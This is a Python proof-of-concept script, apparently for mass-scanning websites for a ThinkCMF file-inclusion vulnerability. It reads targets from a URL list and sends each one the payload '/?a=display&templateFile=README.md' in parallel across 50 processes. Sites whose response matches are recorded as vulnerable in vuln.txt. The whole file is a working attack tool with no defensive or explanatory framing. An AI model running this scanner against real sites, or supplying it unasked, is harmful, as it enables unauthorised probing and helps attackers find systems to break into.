# conding:utf-8
import requests
import urllib3
urllib3.disable_warnings()
from multiprocessing import Pool


#THINKCMF包含漏洞

def poc(url):
    
    headers={"user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}
    payload="/?a=display&templateFile=README.md"
    try:
        url=url+payload
        if "异常捕获" in requests.get(url=url,headers=headers,timeout=5).text or "ThinkCMF-跳转提示" in requests.get(url=url,headers=headers,timeout=5).text:
            pass
        elif "ThinkCMF" in requests.get(url=url,headers=headers,timeout=5,allow_redirects=False).text:
            print("[*]存在ThinkCMF")
            with open("vuln.txt",'a+') as f:
                f.write(f"{url}|{url}存在ThinkCMF包含漏洞")
                f.close()
        else:
            pass
  
    except EOFError as e:
	    print(e)
    

if __name__ == '__main__':
	p = Pool(50)
	URLS=[]
	for i in open("url.txt",encoding='utf-8'):
		URLS.append(i.strip('\n'))
	for k in URLS:
		p.apply_async(poc,args=(k,))
	p.close()
	p.join()